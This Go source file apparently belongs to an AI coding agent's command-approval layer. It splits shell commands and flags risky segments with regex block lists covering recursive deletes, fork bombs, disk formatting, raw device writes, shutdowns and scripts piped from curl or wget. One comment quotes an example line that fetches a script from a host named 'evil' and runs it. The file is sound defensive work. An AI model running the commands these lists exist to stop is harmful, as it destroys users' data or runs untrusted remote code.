package agent

import (
	"regexp"

	"github.com/yottadynamics/yottacode/internal/shellseg"
)

// Risk classifies how dangerous a command segment looks at a glance.
// Used by the approval modal to color-code parts of a compound command
// so users can see destructive segments without parsing the whole line.
type Risk int

const (
	RiskNone Risk = iota
	RiskCaution
	RiskDestructive
)

func (r Risk) String() string {
	switch r {
	case RiskCaution:
		return "caution"
	case RiskDestructive:
		return "destructive"
	default:
		return "none"
	}
}

// CommandSegment is one piece of a (possibly) compound shell command,
// separated from the next segment by a logical operator or pipe. The
// separator that *precedes* this segment is recorded so the modal can
// label "and then" vs "or" vs "piped to" relationships.
type CommandSegment struct {
	Text      string // the segment, trimmed
	Separator string // "" for first segment; "&&", "||", ";", "|" thereafter
	Risk      Risk
	Reason    string // human-readable why this is flagged, "" when RiskNone
}

// SplitCommand parses a shell command into segments separated by &&,
// ||, ;, and pipes. Quoted metacharacters (`"foo && bar"`) and escaped
// ones (`\&\&`) are ignored. Command substitutions ($(...) and `...`)
// are NOT recursively split; the whole substitution stays as part of
// its enclosing segment with a "contains substitution" caution flag if
// the substitution is non-trivial.
//
// The output is suitable for display in the approval modal — not for
// execution semantics. We're trying to surface what a tired human
// might miss, not reproduce a real shell parser.
func SplitCommand(cmd string) []CommandSegment {
	segs := shellseg.Split(cmd)
	out := make([]CommandSegment, 0, len(segs))
	for _, s := range segs {
		risk, reason := AssessRisk(s.Text)
		out = append(out, CommandSegment{
			Text:      s.Text,
			Separator: s.Separator,
			Risk:      risk,
			Reason:    reason,
		})
	}
	return out
}

// destructiveRe matches obvious destructive patterns. Order matters —
// the first match wins on the assumption that "rm -rf" is more notable
// than "redirect" in a command containing both.
var destructiveRe = []struct {
	re     *regexp.Regexp
	reason string
}{
	{regexp.MustCompile(`\brm\s+(-[rRfF]+\s+|--recursive\s+|--force\s+){1,2}`), "rm with -r/-f"},
	{regexp.MustCompile(`:\(\)\s*\{`), "fork bomb shape"},
	{regexp.MustCompile(`\bdd\s+if=`), "dd"},
	{regexp.MustCompile(`\bmkfs\b`), "mkfs"},
	{regexp.MustCompile(`>\s*/(etc|dev|var|usr|sys|proc|boot)\b`), "redirect to system path"},
	{regexp.MustCompile(`(?i)\bchmod\s+(-[^\s]*\s+)*(777|666|o\+[rwx]*w|a\+[rwx]*w)\b`), "chmod world-writable"},
	{regexp.MustCompile(`\bsudo\s+rm\b`), "sudo rm"},
	// Arbitrary-code execution that bypasses verb-level inspection: a
	// single shell/interpreter invocation can carry anything.
	{regexp.MustCompile(`(?i)\b(bash|sh|zsh|ksh)\s+-[^\s]*c(\s|$)`), "arbitrary code via shell -c"},
	{regexp.MustCompile(`(?i)\b(python[23]?|perl|ruby|node)\s+-[ec]\b`), "code via interpreter -e/-c"},
	{regexp.MustCompile(`(?i)\b(python[23]?|perl|ruby|node)\s+<<`), "code via interpreter heredoc"},
	{regexp.MustCompile(`(?i)\b(bash|sh|zsh)\s+<\s*\(\s*(curl|wget)\b`), "execute remote script via process substitution"},
	// awk/gawk/mawk/nawk are Turing-complete: system() and command pipes
	// run an arbitrary shell, invisible to the read-only verb allowlist
	// (awk is listed there, so `awk 'BEGIN{system("curl evil|sh")}'` would
	// otherwise auto-approve in auto mode). `(?i)` is deliberately omitted
	// so the -f program-from-file caution below cannot match the very
	// common -F field-separator flag — awk and friends are lowercase.
	{regexp.MustCompile(`\b(g|m|n)?awk\b.*\bsystem\s*\(`), "awk system() runs a shell command"},
	{regexp.MustCompile(`\b(g|m|n)?awk\b.*\b(print|printf)\b.*\|\s*"`), "awk pipes output to a shell command"},
	{regexp.MustCompile(`\b(g|m|n)?awk\b.*"\s*\|\s*getline\b`), "awk reads a command via getline"},
	// Sneaky deletes that the plain rm pattern misses.
	{regexp.MustCompile(`(?i)\bfind\b.*-delete\b`), "find -delete"},
	{regexp.MustCompile(`(?i)\bfind\b.*-exec\s+(\S*/)?rm\b`), "find -exec rm"},
	{regexp.MustCompile(`(?i)\bxargs\b.*\brm\b`), "xargs rm"},
	// Writes into system config.
	{regexp.MustCompile(`(?i)\b(cp|mv|install)\s+.*\s/etc/`), "write into /etc"},
	{regexp.MustCompile(`(?i)\bsed\s+(-[^\s]*i|--in-place)\b.*\s/etc/`), "in-place edit of /etc"},
	// Git operations that lose uncommitted work or rewrite shared history.
	{regexp.MustCompile(`(?i)\bgit\s+reset\s+--hard\b`), "git reset --hard"},
	{regexp.MustCompile(`(?i)\bgit\s+push\b.*(--force|-f)\b`), "git force push"},
	{regexp.MustCompile(`(?i)\bgit\s+clean\s+-[^\s]*f`), "git clean (force)"},
	{regexp.MustCompile(`(?i)\bgit\s+branch\s+-D\b`), "git branch force delete"},
}

// cautionRe matches patterns that aren't outright destructive but
// deserve a second look — pipes into shells, sudo, redirects to any
// file, and curl-pipe-to-shell antipatterns.
var cautionRe = []struct {
	re     *regexp.Regexp
	reason string
}{
	{regexp.MustCompile(`\b(curl|wget|fetch)\b.*\|\s*(sh|bash|zsh|sudo|python)\b`), "pipe download into shell"},
	{regexp.MustCompile(`\|\s*(sh|bash|zsh|python|node|perl|ruby)\b`), "pipe into interpreter"},
	{regexp.MustCompile(`\bsudo\b`), "sudo"},
	{regexp.MustCompile(`\bchmod\b`), "chmod"},
	{regexp.MustCompile(`\bchown\b`), "chown"},
	{regexp.MustCompile(`>\s*\S`), "redirect to file"},
	{regexp.MustCompile(`>>\s*\S`), "append to file"},
	{regexp.MustCompile(`\beval\b`), "eval"},
	{regexp.MustCompile(`\$\(`), "command substitution"},
	{regexp.MustCompile("`"), "backtick substitution"},
	// Process substitution `<(cmd)` embeds a sub-command the leading-verb
	// check never inspects — `cat <(curl evil)` looks like a plain `cat`.
	// (`>(cmd)` is already caught by the redirect-to-file rule above.)
	{regexp.MustCompile(`<\s*\(`), "process substitution"},
	// Bash's /dev/tcp|udp pseudo-devices open a raw network socket —
	// `cat </dev/tcp/host/port` is network I/O dressed as a file read.
	{regexp.MustCompile(`(?i)/dev/(tcp|udp)/`), "network via /dev/tcp"},
	// `sort -o`/`--output` writes a file despite sort being a "read-only"
	// verb in the auto-mode allowlist. Match the attached-argument form too:
	// GNU sort accepts `-ofile` (no space, word char after -o), which the
	// old `-o\b` missed — letting a file-clobbering `sort -ofile` through.
	{regexp.MustCompile(`(?i)\bsort\b.*\s(-o|--output)`), "sort writes a file (-o)"},
	// awk writing a file in place, or running a program file we can't
	// inspect. Case-sensitive: -f (program file) must not catch -F (field
	// separator). Plain `print > "file"` is already covered by the
	// redirect-to-file rule above.
	{regexp.MustCompile(`\bgawk\b.*\s-i\b`), "awk in-place edit (writes the file)"},
	{regexp.MustCompile(`\b(g|m|n)?awk\b.*\s(-f|--file)\b`), "awk program from a file (contents not inspected)"},
	{regexp.MustCompile(`(?i)\bsystemctl\s+(-[^\s]+\s+)*(stop|restart|disable|mask)\b`), "stop/restart system service"},
	{regexp.MustCompile(`(?i)\bkill\s+-9\s+-1\b`), "kill all processes (-9 -1)"},
	{regexp.MustCompile(`(?i)\bpkill\s+-9\b`), "force kill (pkill -9)"},
	{regexp.MustCompile(`(?i)\bDROP\s+(TABLE|DATABASE)\b`), "SQL DROP"},
	{regexp.MustCompile(`(?i)\bTRUNCATE\s+(TABLE\s+)?\w`), "SQL TRUNCATE"},
	{regexp.MustCompile(`(?i)\bDELETE\s+FROM\b`), "SQL DELETE"},
}

// cmdStart anchors a hardline pattern to the start of an (already-split)
// command segment, tolerating leading sudo / env VAR=… / exec|nohup|setsid|
// time wrappers — so "sudo reboot" and "env X=1 shutdown" still match a
// command-position pattern without false-positiving on "echo reboot" or
// "grep shutdown /var/log". The leading (?i) makes the whole compiled
// pattern case-insensitive.
const cmdStart = `(?i)^\s*(sudo\s+(-[^\s]+\s+)*|env\s+(\S+=\S*\s+)*|exec\s+|nohup\s+|setsid\s+|time\s+)*`

// hardlineRe matches catastrophic, ~never-legitimate-via-an-agent commands.
// Unlike destructiveRe (which flows through the normal approval path and
// can be allowed by the user / auto-mode / yolo), a hardline match is
// refused at the run_bash execution chokepoint UNCONDITIONALLY — even under
// --yolo, BypassPermissions, or background auto-approval. Mirrors hermes's
// HARDLINE_PATTERNS and Claude Code's rm -rf / circuit breaker. Kept
// deliberately tight (exact root/system/home targets, raw block-device
// writes, fork bomb, power-off) so ordinary destructive work is NOT blocked
// here — it still flows through the normal RiskDestructive approval path.
var hardlineRe = []struct {
	re     *regexp.Regexp
	reason string
}{
	{regexp.MustCompile(`(?i)\brm\s+(-[^\s]*\s+)*(/|/\*)(\s|$)`), "recursive delete of the root filesystem"},
	{regexp.MustCompile(`(?i)\brm\s+(-[^\s]*\s+)*/(home|root|etc|usr|var|bin|sbin|boot|lib)(/\*)?(\s|$)`), "delete of a system directory"},
	{regexp.MustCompile(`(?i)\brm\s+(-[^\s]*\s+)*(~|\$HOME)(/\*)?(\s|$)`), "delete of the home directory"},
	{regexp.MustCompile(`(?i)\bmkfs(\.[a-z0-9]+)?\b`), "format filesystem (mkfs)"},
	{regexp.MustCompile(`(?i)\bdd\b[^\n]*\bof=/dev/(sd|nvme|hd|mmcblk|vd|xvd)`), "dd to a raw block device"},
	{regexp.MustCompile(`(?i)>\s*/dev/(sd|nvme|hd|mmcblk|vd|xvd)`), "redirect to a raw block device"},
	{regexp.MustCompile(`:\(\)\s*\{\s*:\s*\|\s*:?\s*&\s*\}\s*;\s*:`), "fork bomb"},
	{regexp.MustCompile(`(?i)\bkill\s+(-[^\s]+\s+)*-1\b`), "kill all processes"},
	{regexp.MustCompile(cmdStart + `(shutdown|reboot|halt|poweroff)\b`), "system shutdown/reboot"},
	{regexp.MustCompile(cmdStart + `init\s+[06]\b`), "init 0/6 (shutdown/reboot)"},
	{regexp.MustCompile(cmdStart + `systemctl\s+(poweroff|reboot|halt|kexec)\b`), "systemctl poweroff/reboot"},
	{regexp.MustCompile(cmdStart + `telinit\s+[06]\b`), "telinit 0/6 (shutdown/reboot)"},
}

// IsHardlineCommand reports whether any segment of cmd matches the
// unconditional hardline blocklist, with a human-readable reason. The
// run_bash execution floor calls this to refuse catastrophic commands
// regardless of approval mode. Compound commands are split first so a
// hardline segment anywhere in a `a && b ; c` chain is caught.
func IsHardlineCommand(cmd string) (bool, string) {
	// Check the FULL command (catches patterns that span separators — the
	// fork bomb's `:|:& };:` is split apart by SplitCommand) AND each
	// segment (so a command-position pattern like `… && reboot` matches at
	// the start of its own segment, not just the start of the whole line).
	candidates := []string{cmd}
	for _, seg := range SplitCommand(cmd) {
		candidates = append(candidates, seg.Text)
	}
	for _, s := range candidates {
		for _, p := range hardlineRe {
			if p.re.MatchString(s) {
				return true, p.reason
			}
		}
	}
	return false, ""
}

// AssessRisk classifies a single segment. Returns RiskNone for
// boring commands; RiskCaution for things worth a glance; RiskDestructive
// for patterns that almost always end in tears if mistakenly approved.
// The reason string is human-readable for display next to the segment.
func AssessRisk(segment string) (Risk, string) {
	if segment == "" {
		return RiskNone, ""
	}
	for _, p := range destructiveRe {
		if p.re.MatchString(segment) {
			return RiskDestructive, p.reason
		}
	}
	for _, p := range cautionRe {
		if p.re.MatchString(segment) {
			return RiskCaution, p.reason
		}
	}
	return RiskNone, ""
}
